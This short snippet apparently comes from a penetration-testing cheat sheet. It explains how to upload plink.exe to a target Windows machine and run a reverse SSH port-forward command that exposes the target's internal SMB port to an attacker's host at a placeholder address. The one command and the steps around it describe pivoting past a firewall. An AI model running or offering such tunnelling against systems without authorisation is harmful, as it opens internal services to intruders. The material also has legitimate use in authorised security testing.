This is useful for exposing inside services that aren’t available from outside the machine, normally due to firewall settings.<br/>
<br/>
Upload plink.exe to target.<br/>
Start SSH on your attacking machine.<br/>
<br/>
For example to expose SMB, on the target run:<br/>
plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS<br/>
<br/>
Note: As of the Fall Creators Update for Windows 10, OpenSSH has been introduced in beta for Windows, so I expect one day we may be able to use just regular old SSH commands for port forwarding, depending on if it’s enabled.</body></html>
